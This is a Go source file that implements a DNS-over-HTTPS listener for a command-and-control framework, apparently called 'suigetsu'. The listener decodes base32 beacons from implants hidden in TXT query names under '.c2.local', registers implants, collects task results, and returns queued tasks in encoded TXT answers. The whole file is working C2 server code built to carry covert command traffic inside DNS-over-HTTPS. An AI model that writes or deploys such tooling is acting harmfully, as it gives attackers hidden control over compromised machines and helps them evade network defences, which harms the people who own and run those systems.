package listeners 
import(
	"encoding/base32"
	"fmt"
	"io"
	"net/http"
	"context"
	"time"
	"strings"
	"suigetsu/server/beacon"
	"github.com/miekg/dns"
)

func (m *Manager) handleDoH(w http.ResponseWriter, r *http.Request){
	body, err := io.ReadAll(r.Body)
	if err != nil{
		http.Error(w, "bad request", 400)
		return
	}
	msg := new(dns.Msg)
	if err := msg.Unpack(body); err != nil{
		http.Error(w, "bad dns message", 400)
		return
	}
	if len(msg.Question) == 0 || msg.Question[0].Qtype != dns.TypeTXT{
		http.Error(w, "bad query", 400)
		return
	}
	name := msg.Question[0].Name
	name = strings.TrimSuffix(name, ".")
	lowerName := strings.ToLower(name)
	if idx := strings.LastIndex(lowerName, ".c2.local"); idx !=-1{
		name = name[:idx]
	}
	name = strings.ReplaceAll(name,".","")
	name = strings.ToUpper(strings.TrimRight(name,"="))
	decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(name)
	if err != nil{
		fmt.Println("DoH: base32 decode error: ", err)
		http.Error(w, "bad payload",400)
		return
	}
	b, err := m.Receiver.Process(decoded)
	if err != nil{
		fmt.Println("DoH: beacon rejected: ",err)
		http.Error(w, "invalid beacon",400)
		return
	}
	implantID := fmt.Sprintf("%x", b.ImplantID)
	if b.Type == beacon.TypeCheckin{
		m.Queue.RegisterImplant(implantID, string(b.Data))
	}
	if b.Type == beacon.TypeResult{
		m.Queue.CompleteTask(implantID, string(b.Data))
	}
	m.Queue.UpdateLastSeen(implantID)
	task , err:= m.Queue.GetNextTask(implantID)
	if err != nil{
		task = "noop"
	}
	resp := new(dns.Msg)
	resp.SetReply(msg)
	resp.Authoritative = true
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(task))
	resp.Answer = append(resp.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name: msg.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class: dns.ClassINET,
			Ttl: 0,
		},
		Txt: []string{encoded},
	})
	packed, err := resp.Pack()
	if err != nil{
		http.Error(w, "pack error", 500)
		return
	}
	w.Header().Set("Content-Type", "application/dns-message")
	w.Write(packed)
}

func (m *Manager) StartDoH(){
	m.mu.Lock()
	if m.activeDoH != nil{
		m.mu.Unlock()
		return
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/dns-query", m.handleDoH)
	server := &http.Server{
		Addr: ":8853",
		Handler: mux,
	}
	m.activeDoH = server
	m.mu.Unlock()
	go func(){
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed{
			fmt.Printf("DoH listener error: %v\n", err)
		}
	}()
}

func (m *Manager) StopDoH() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.activeDoH == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_ = m.activeDoH.Shutdown(ctx)
	m.activeDoH = nil
}